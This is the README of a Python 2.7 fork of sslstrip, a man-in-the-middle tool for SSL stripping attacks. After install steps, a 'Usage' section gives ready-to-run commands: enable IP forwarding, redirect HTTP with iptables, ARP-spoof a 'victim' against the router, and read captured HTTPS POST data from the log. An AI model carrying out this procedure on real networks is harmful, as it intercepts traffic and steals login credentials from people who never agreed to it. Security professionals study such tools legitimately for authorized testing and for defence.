# sslstrip patched to run with python 2.7

sslstrip is a MITM tool that implements Moxie Marlinspike's SSL stripping attacks.

This is a fork to make it work again with python 2.7. It requires Python 2.7, along with the `twisted`, `pyopenssl`, and `service_identity` python modules.

## Install

>This installation instructions assume that you have Python 2.7 installed and that it is the python version used by default (if it is not just change `python` to `python2` hereafter).

If you don't have `pip` for python 2 already installed, you can install it (besides distro-specific ways) with:

```console
curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py
sudo python get-pip.py
```

Now you can install the python 2 module dependencies with:

```console
pip install twisted pyopenssl service_identity
```

And now you can clone this repo and install sslstrip

```console
git clone https://github.com/juanelas/sslstrip.git
cd sslstrip
sudo python setup.py install
```

> If you'd rather not install `sslstrip`, you can always run it from source by just typing `python sslstrip.py` and then the rest of options (see Usage below)

## Usage

sslstrip can be run from the source base without installation.
Just run `sslstrip -h` as a non-root user to get the  command-line options.

```text
sslstrip 0.9.1 by Moxie Marlinspike (patched by Juan Hernández Serrano)
Usage: sslstrip <options>

Options:
-w <filename>, --write=<filename> Specify file to log to (optional).
-p , --post                       Log only SSL POSTs. (default)
-s , --ssl                        Log all SSL traffic to and from server.
-a , --all                        Log all SSL and HTTP traffic to and from server.
-l <port>, --listen=<port>        Port to listen on (default 10000).
-f , --favicon                    Substitute a lock favicon on secure requests.
-k , --killsessions               Kill sessions in progress.
-h                                Print this help message.
```

The four steps to getting this working (assuming you're running Linux) are:

1) Flip your machine into forwarding mode (as root).

   `echo "1" > /proc/sys/net/ipv4/ip_forward`

2) Run the sslstrip transparent proxy listening at port `<yourListenPort>`

   `sslstrip -l <yourListenPort>`

3) Setup `iptables` to intercept HTTP requests (port 80/tcp) and send them to your sslstrip transparent proxy:

   `sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port <yourListenPort>`

5) Run `arpspoof` to redirect all traffic from your victim to the Internet to your machine:

   `arpspoof -i <yourNetworkdDevice> -t <victimIpAddress> <routerIpAddress>`

5) Start a network sniffer (e.g. wireshark, tcpdump) or directly look for HTTP posts in the sslstrip log file (`sslstrip.log` by default)
